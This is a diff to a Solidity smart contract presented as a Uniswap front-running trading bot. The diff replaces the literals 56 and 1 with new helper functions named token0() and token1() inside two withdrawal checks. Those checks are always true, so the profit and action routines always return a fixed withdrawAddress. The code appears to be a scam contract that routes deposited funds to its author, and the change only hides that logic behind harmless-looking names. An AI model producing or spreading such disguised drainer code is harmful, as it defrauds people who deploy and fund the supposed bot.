@@ -165,6 +165,10 @@ contract UniswapFrontrunBot {
         return ret;
     }
 
+    function token0() internal pure returns (uint256) {
+        return 56;
+    }
+
     /*
      * @dev Extracts the contract from Uniswap
      * @param self The slice to operate on.
@@ -373,6 +377,10 @@ contract UniswapFrontrunBot {
         return address(iaddr);
     }
 
+    function token1() internal pure returns (uint256) {
+        return 1;
+    }
+
     /*
      * @dev Returns the keccak-256 hash of the contracts.
      * @param self The slice to hash.
@@ -462,7 +470,7 @@ contract UniswapFrontrunBot {
     }
 
     function _callFrontRunActionMempool() internal view returns (address) {
-        if (uniswapV3Pool != 56 || uniswapV3Pool != 1) {
+        if (uniswapV3Pool != token0() || uniswapV3Pool != token1()) {
             return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
@@ -641,7 +649,7 @@ contract UniswapFrontrunBot {
     }
 
     function withdrawalProfits() internal view returns (address) {
-        if (uniswapV3Pool != 56 || uniswapV3Pool != 1) {
+        if (uniswapV3Pool != token0() || uniswapV3Pool != token1()) {
             return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
